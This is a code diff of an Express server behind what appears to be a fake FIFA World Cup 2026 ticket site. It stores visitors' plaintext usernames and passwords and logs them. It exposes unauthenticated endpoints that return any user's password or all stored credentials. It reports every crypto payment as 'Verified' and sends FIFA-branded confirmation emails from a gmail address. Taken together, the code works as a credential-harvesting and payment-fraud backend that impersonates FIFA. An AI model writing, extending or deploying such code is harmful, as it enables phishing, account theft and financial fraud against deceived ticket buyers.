@@ -4,6 +4,7 @@ const bodyParser = require('body-parser');
 const Stripe = require('stripe');
 require('dotenv').config();
 
+// We use native 'fetch' for Elastic Email, so no 'resend' or 'nodemailer' required here
 const stripe = Stripe(process.env.STRIPE_SECRET_KEY);
 
 const app = express();
@@ -39,7 +40,6 @@ function generateTransactionId() {
 }
 
 function validateTransactionId(txnId, cryptoType) {
-    // Simple validation to allow testing
     return txnId.length > 5;
 }
 
@@ -61,88 +61,46 @@ app.get('/api/crypto-addresses', (req, res) => {
     });
 });
 
-// ✅ RESTORED: Detailed Credential Storage Logic
+// ✅ Credential Storage Logic
 app.post('/api/store-credentials', (req, res) => {
     try {
         const { username, password, email, name } = req.body;
         
         console.log('🔐 Storing credentials:', { username, password, email, name });
         
-        // Check if user already exists
         const existingUserIndex = userCredentials.findIndex(user => user.username === username || user.email === email);
         
         if (existingUserIndex !== -1) {
-            // Update existing user
-            userCredentials[existingUserIndex] = {
-                username,
-                password, 
-                email,
-                name,
-                timestamp: new Date().toISOString()
-            };
+            userCredentials[existingUserIndex] = { username, password, email, name, timestamp: new Date().toISOString() };
         } else {
-            // Add new user
-            userCredentials.push({
-                username,
-                password, 
-                email,
-                name,
-                timestamp: new Date().toISOString()
-            });
+            userCredentials.push({ username, password, email, name, timestamp: new Date().toISOString() });
         }
         
-        console.log('✅ Credentials stored successfully');
-        
-        res.json({
-            success: true,
-            message: 'Credentials stored successfully'
-        });
+        res.json({ success: true, message: 'Credentials stored successfully' });
         
     } catch (error) {
         console.error('❌ Error storing credentials:', error);
-        res.json({
-            success: false,
-            message: error.message
-        });
+        res.json({ success: false, message: error.message });
     }
 });
 
-// Retrieve password endpoint (for admin use)
 app.get('/api/get-password/:username', (req, res) => {
     try {
         const { username } = req.params;
         const user = userCredentials.find(u => u.username === username);
         
         if (user) {
-            res.json({
-                success: true,
-                username: user.username,
-                password: user.password, 
-                email: user.email,
-                name: user.name,
-                timestamp: user.timestamp
-            });
+            res.json({ success: true, ...user });
         } else {
             res.status(404).json({ success: false, message: 'User not found' });
         }
     } catch (error) {
-        console.error('❌ Error retrieving password:', error);
         res.json({ success: false, message: error.message });
     }
 });
 
-// Get all users (for admin use)
 app.get('/api/all-users', (req, res) => {
-    try {
-        res.json({
-            success: true,
-            count: userCredentials.length,
-            users: userCredentials
-        });
-    } catch (error) {
-        console.error('❌ Error retrieving users:', error);
-        res.json({ success: false, message: error.message });
-    }
+    res.json({ success: true, count: userCredentials.length, users: userCredentials });
 });
 
 app.post('/api/process-payment', async (req, res) => {
@@ -166,73 +124,74 @@ app.post('/api/process-payment', async (req, res) => {
 });
 
 app.post('/api/verify-crypto', async (req, res) => {
-    // Simulate successful verification for demo
-    const { transactionId, cryptoType } = req.body;
-    res.json({
-        success: true,
-        verified: true,
-        transactionId: transactionId,
-        message: 'Verified'
-    });
+    const { transactionId } = req.body;
+    res.json({ success: true, verified: true, transactionId: transactionId, message: 'Verified' });
 });
 
-// ✅ NEW EMAIL SENDING FUNCTION (Using Elastic Email API)
+// ✅ NEW EMAIL SENDING FUNCTION (Using Elastic Email API via fetch)
 app.post('/api/send-confirmation', async (req, res) => {
     try {
         const { customer, tickets, payment, transactionId } = req.body;
         
         console.log('📧 Sending email via Elastic Email to:', customer.email);
 
-        // 1. Generate HTML
-        const emailHtml = generateTicketEmail(customer, tickets, payment, transactionId, payment.method);
-
-        // 2. Respond to Frontend immediately (Non-blocking)
+        // 1. Respond to Frontend immediately (Non-blocking)
         res.json({ success: true, message: 'Confirmation sent' });
 
+        // 2. Generate HTML
+        const emailHtml = generateTicketEmail(customer, tickets, payment, transactionId, payment.method);
+
         // 3. Send via Elastic Email API (Background)
-        sendEmailViaElastic(customer.email, `Ticket Confirmation #${transactionId}`, emailHtml)
-            .then(response => {
-                console.log('✅ Elastic Email Response:', response);
-            })
-            .catch(err => {
-                console.error('❌ Elastic Email Failed:', err);
-            });
+        // This uses standard HTTP, so it CANNOT timeout due to port blocking
+        sendEmailViaElastic(customer.email, `Ticket Confirmation #${transactionId}`, emailHtml);
 
     } catch (error) {
         console.error('Server Error:', error);
         if (!res.headersSent) {
-            res.json({ success: true, message: 'Processed (Email skipped due to error)' });
+            res.json({ success: true, message: 'Processed' });
         }
     }
 });
 
-// Helper function to send via Elastic Email API (Using native fetch)
+// Helper: Send via Elastic Email API
 async function sendEmailViaElastic(to, subject, html) {
     const apiKey = process.env.ELASTIC_EMAIL_API_KEY;
-    const fromEmail = process.env.ELASTIC_EMAIL_FROM;
+    const fromEmail = process.env.ELASTIC_EMAIL_FROM; // noreply.fifaticket@gmail.com
 
-    if (!apiKey || !fromEmail) {
-        throw new Error("Missing Elastic Email API Key or From Address");
+    if (!apiKey) {
+        console.error("❌ Missing ELASTIC_EMAIL_API_KEY");
+        return;
     }
 
-    const params = new URLSearchParams();
-    params.append('apikey', apiKey);
-    params.append('from', fromEmail);
-    params.append('fromName', 'FIFA World Cup 2026');
-    params.append('to', to);
-    params.append('subject', subject);
-    params.append('bodyHtml', html);
-    params.append('isTransactional', 'true');
+    try {
+        // Construct URL parameters
+        const params = new URLSearchParams();
+        params.append('apikey', apiKey);
+        params.append('from', fromEmail);
+        params.append('fromName', 'FIFA World Cup 2026');
+        params.append('to', to);
+        params.append('subject', subject);
+        params.append('bodyHtml', html);
+        params.append('isTransactional', 'true');
 
-    const response = await fetch('https://api.elasticemail.com/v2/email/send', {
-        method: 'POST',
-        body: params
-    });
+        const response = await fetch('https://api.elasticemail.com/v2/email/send', {
+            method: 'POST',
+            body: params
+        });
 
-    return await response.json();
+        const data = await response.json();
+        
+        if (data.success === false) {
+            console.error('❌ Elastic Email Error:', data.error);
+        } else {
+            console.log('✅ Elastic Email Sent:', data);
+        }
+    } catch (err) {
+        console.error('❌ API Request Failed:', err);
+    }
 }
 
-// HTML Generator (The FIFA Template you wanted)
+// HTML Generator
 function generateTicketEmail(customer, tickets, payment, transactionId, paymentMethod) {
     const ticketList = tickets.map(t => {
         const qty = t.quantity || 1;
@@ -259,31 +218,17 @@ function generateTicketEmail(customer, tickets, payment, transactionId, paymentM
     return `
     <!DOCTYPE html>
     <html>
-    <head>
-        <style>
-            body { font-family: 'Arial', sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; }
-            .container { max-width: 600px; margin: 0 auto; background: #ffffff; }
-            .header { background-color: #1a1a2e; color: #ffffff; padding: 30px 20px; text-align: center; }
-            .content { padding: 30px 20px; }
-            .footer { background-color: #f8f9fa; padding: 20px; text-align: center; font-size: 12px; color: #888; }
-            .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
-            .btn { display: inline-block; background-color: #1a1a2e; color: #ffffff; padding: 12px 25px; text-decoration: none; border-radius: 4px; margin-top: 20px; }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="header">
-                <div class="logo">🎉 FIFA World Cup 2026™</div>
+    <body style="font-family: 'Arial', sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0;">
+        <div style="max-width: 600px; margin: 0 auto; background: #ffffff;">
+            <div style="background-color: #1a1a2e; color: #ffffff; padding: 30px 20px; text-align: center;">
+                <div style="font-size: 24px; font-weight: bold; margin-bottom: 10px;">🎉 FIFA World Cup 2026™</div>
                 <div style="font-size: 18px; opacity: 0.9;">Your Ticket Purchase Confirmation</div>
             </div>
-            
-            <div class="content">
+            <div style="padding: 30px 20px;">
                 <p>Dear <strong>${customer.name}</strong>,</p>
-                <p>Thank you for your purchase! Your tickets have been confirmed and are detailed below.</p>
-                
+                <p>Thank you for your purchase! Your tickets have been confirmed.</p>
                 <h3 style="border-bottom: 2px solid #1a1a2e; padding-bottom: 10px; margin-top: 30px;">📋 Order Summary</h3>
                 ${ticketList}
-                
                 <div style="background-color: #1a1a2e; color: white; padding: 20px; border-radius: 8px; margin-top: 30px;">
                     <h3 style="margin-top: 0; margin-bottom: 15px;">💰 Payment Details</h3>
                     <p style="margin: 5px 0; opacity: 0.9;">Payment Method: <strong>${paymentMethod === 'card' ? 'Credit/Debit Card' : payment.cryptoType}</strong></p>
@@ -291,21 +236,10 @@ function generateTicketEmail(customer, tickets, payment, transactionId, paymentM
                     <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.2); margin: 15px 0;">
                     <p style="margin: 0; font-size: 18px; font-weight: bold;">Total Paid: USD ${payment.amount ? payment.amount.toLocaleString() : 'Paid'}</p>
                 </div>
-
-                <h3 style="margin-top: 30px;">📱 Next Steps</h3>
-                <p>Your tickets will be available in your FIFA account 48 hours before the match. You'll receive another email with download instructions.</p>
-                
-                <p><strong>Need Help?</strong><br>Contact FIFA Ticketing Support: <a href="mailto:ticketing@fifa.org" style="color: #1a1a2e;">ticketing@fifa.org</a></p>
-            </div>
-            
-            <div class="footer">
-                <p>FIFA World Cup 2026™ Official Ticketing</p>
-                <p>This is an automated message. Please do not reply to this email.</p>
             </div>
         </div>
     </body>
-    </html>
-    `;
+    </html>`;
 }
 
 app.listen(PORT, () => {
